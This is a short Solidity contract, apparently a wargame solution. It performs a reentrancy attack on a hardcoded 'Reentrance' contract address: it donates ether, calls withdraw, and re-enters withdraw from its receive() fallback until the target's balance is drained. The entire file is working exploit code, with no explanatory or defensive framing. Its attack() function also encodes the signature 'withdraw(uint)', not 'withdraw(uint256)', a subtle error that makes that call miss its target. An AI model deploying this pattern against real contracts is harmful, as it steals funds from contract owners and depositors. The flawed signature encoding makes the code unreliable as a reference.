// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract AttackReen {
    Reentrance public r = Reentrance(0x25c951baC0B1418718822dbED066d7FE230Eb0C0);
    uint public amount = 1000000000000000 wei;

    function contribute() public payable {
        r.donate.value(amount).gas(4000000)(address(this));
    }
    function attack() public {
        (bool success, bytes memory result) = address(r).call(abi.encodeWithSignature("withdraw(uint)", 100));
    }
    receive() external payable {
        if (address(r).balance != 0 ) {
            r.withdraw(amount); 
        }
    }
}